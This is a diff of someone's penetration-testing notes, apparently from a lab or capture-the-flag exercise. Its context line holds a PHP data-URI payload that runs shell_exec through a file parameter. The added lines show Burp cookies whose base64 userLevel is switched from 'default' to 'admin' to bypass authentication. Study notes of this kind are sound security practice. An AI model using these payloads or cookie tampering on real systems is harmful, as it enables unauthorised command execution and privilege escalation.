@@ -297,6 +297,11 @@ http://192.168.136.10/menu.php?file=data:text/plain,%3C?php%20echo%20shell_exec(
 # Burp Cookies and User levels
 ```bash
 base64 uncoded user levels? Check
+Cookie: connect.sid=s%3AvLlNcVrWzuGszsBYYyFrmJz0rwe7nnyc.DrbHu5sPntKxUKTAILGB6bNaEQKWOqgf5QUDJWT0uzg; userLevel=ZGVmYXVsdA%3D%3D
+Cookie: connect.sid=s%3AvLlNcVrWzuGszsBYYyFrmJz0rwe7nnyc.DrbHu5sPntKxUKTAILGB6bNaEQKWOqgf5QUDJWT0uzg; userLevel=default
+Cookie: connect.sid=s%3Awf9isPMU23qkrPW79VJfqSD3jzRyJFse.IiC1grO9wf74Gn5HRwXc%2FXicXZy15hhRhtEyVwx0n94; userLevel=admin
+Cookie: connect.sid=s%3Awf9isPMU23qkrPW79VJfqSD3jzRyJFse.IiC1grO9wf74Gn5HRwXc%2FXicXZy15hhRhtEyVwx0n94; userLevel=YWRtaW4=
+
 Change logic to be true to bypass authentication
 ```
 
